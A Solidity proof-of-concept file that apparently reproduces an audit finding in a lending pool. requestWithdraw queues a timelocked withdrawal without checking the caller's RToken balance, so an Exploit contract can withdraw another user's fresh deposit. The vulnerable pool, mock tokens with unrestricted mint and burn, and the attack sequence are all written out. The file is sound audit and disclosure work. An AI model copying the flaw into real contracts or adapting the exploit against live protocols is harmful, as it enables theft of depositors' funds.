// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — H-05 (Pashov, 2025-06-26)
    requestWithdraw records a timelock without checking the RToken balance.
    Bob queues 1000, waits out the 30 minute timelock, then receives Alice's
    freshly deposited RToken and withdraws it in that same block. The
    same-block flash-loan check looks at Bob, who never deposited. */

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LendingPool {
    struct Timelock {
        uint256 amount;
        uint64 readyAt;
        uint64 expireAt;
    }

    struct Parameters {
        uint64 withdrawTimelockDuration;
        uint64 withdrawTimelockDelay;
    }

    Token public underlying;
    Token public rToken;
    Parameters public parameters;
    mapping(address => Timelock) public timelock;
    mapping(address => uint256) public depositBlock;

    constructor(Token _underlying, Token _rToken) {
        underlying = _underlying;
        rToken = _rToken;
        parameters = Parameters({withdrawTimelockDuration: 30 minutes, withdrawTimelockDelay: 7 days});
    }

    function requestWithdraw(uint256 amount) external {
        Timelock storage t = timelock[msg.sender];
        t.amount = amount; // @> VULN: [S2] no RToken balance check. Bob can queue 1000 while holding 0.
        // FIX: require(rToken.balanceOf(msg.sender) >= amount).
        t.readyAt = uint64(block.timestamp + parameters.withdrawTimelockDuration); // [S3]
        t.expireAt = uint64(block.timestamp + parameters.withdrawTimelockDuration + parameters.withdrawTimelockDelay);
    }

    function deposit(uint256 amount) external {
        require(underlying.transferFrom(msg.sender, address(this), amount), "pull");
        depositBlock[msg.sender] = block.timestamp; // [S5]
        rToken.mint(msg.sender, amount);
    }

    function _executeWithdrawTimelock(uint256 amount) internal {
        Timelock storage t = timelock[msg.sender];
        require(t.amount >= amount, "amount");
        require(block.timestamp >= t.readyAt, "timelock");
        require(block.timestamp <= t.expireAt, "expired");
        t.amount -= amount;
    }

    function withdraw(uint256 amount) external {
        require(depositBlock[msg.sender] != block.timestamp, "CannotWithdrawInSameBlock"); // [S6]
        _executeWithdrawTimelock(amount);
        rToken.burn(msg.sender, amount);
        require(underlying.transfer(msg.sender, amount), "push");
    }
}

contract Alice {
    function approve(Token token, address spender) external {
        token.approve(spender, type(uint256).max);
    }

    function deposit(LendingPool pool, uint256 amount) external {
        pool.deposit(amount);
    }

    function send(Token token, address to, uint256 amount) external {
        require(token.transfer(to, amount), "send");
    }
}

contract Exploit {
    Token public underlying; // nonce 1
    Token public rToken; // nonce 2
    LendingPool public pool; // nonce 3
    Alice public alice; // nonce 4
    uint256 public constant AMOUNT = 1000 ether;

    constructor() {
        underlying = new Token("crvUSD");
        rToken = new Token("RToken");
        pool = new LendingPool(underlying, rToken);
        alice = new Alice();
        underlying.mint(address(alice), AMOUNT);
        alice.approve(underlying, address(pool));
    }

    function queue() external {
        require(rToken.balanceOf(address(this)) == 0, "bob starts empty"); // [S1]
        pool.requestWithdraw(AMOUNT);
    }

    function complete() external {
        alice.deposit(pool, AMOUNT); // [S4]
        alice.send(rToken, address(this), AMOUNT);
        pool.withdraw(AMOUNT);
        require(underlying.balanceOf(address(this)) == AMOUNT, "bob took alice's deposit");
        require(depositBlockOf(address(this)) == 0, "bob never deposited");
    }

    function depositBlockOf(address who) public view returns (uint256) {
        return pool.depositBlock(who);
    }
}
